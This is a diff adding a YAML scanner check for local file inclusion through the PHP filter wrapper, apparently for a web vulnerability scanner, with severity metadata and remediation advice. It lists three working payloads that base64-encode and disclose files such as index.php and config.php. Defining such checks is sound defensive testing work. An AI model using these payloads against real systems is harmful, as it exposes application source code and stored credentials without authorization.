@@ -1,0 +1,21 @@
+id: lfi-php-filter
+name: LFI via PHP filter wrapper (source disclosure)
+family: lfi
+severity: high
+cwe: CWE-98
+owasp: WSTG-INPV-11
+cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+inject_into: [query, body]
+payloads:
+  - "php://filter/convert.base64-encode/resource=index.php"
+  - "php://filter/read=convert.base64-encode/resource=index"
+  - "php://filter/convert.base64-encode/resource=config.php"
+oracle:
+  type: any_of
+  checks:
+    - type: php_filter
+confirm_reproducible: true
+remediation: >-
+  Disable PHP wrappers on file parameters (allow_url_include=Off; validate against a
+  fixed allow-list of filenames, not paths). Never pass user input to include/require
+  or file APIs, and map an opaque id to a known file instead of accepting a path.
